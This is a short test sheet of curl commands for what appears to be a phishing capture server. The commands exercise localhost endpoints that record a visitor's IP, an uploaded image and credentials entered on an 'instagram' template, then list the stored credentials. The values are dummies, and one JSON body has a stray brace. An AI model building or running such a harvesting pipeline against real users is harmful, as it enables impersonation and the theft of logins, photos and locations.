# Test Capture Pipeline

Test all capture endpoints:

```bash
# IP capture
curl -s -X POST http://localhost:8080/api/capture/ip -H "Content-Type: application/json" -d '{}'

# Image capture
curl -s -X POST http://localhost:8080/api/capture/image -H "Content-Type: application/json" -d '{"cat":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="}'}

# Credential capture
curl -s -X POST http://localhost:8080/api/capture/credentials -H "Content-Type: application/json" -d '{"template_id":"instagram","username":"test@test.com","password":"pass123"}'

# Check stats
curl -s http://localhost:8080/api/stats

# List credentials
curl -s http://localhost:8080/api/credentials
```
